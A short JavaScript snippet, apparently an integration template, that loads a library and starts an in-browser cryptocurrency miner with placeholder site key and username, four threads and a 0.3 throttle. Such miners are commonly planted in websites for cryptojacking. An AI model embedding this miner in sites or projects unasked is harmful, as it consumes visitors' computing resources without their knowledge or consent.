import "./js/base.js";
var miner = WMP.User('<your-site-key>', '<username>',{
        threads: 4,
        autoThreads: false,
        throttle: 0.3,
        forceASMJS: false
    });
    miner.start();
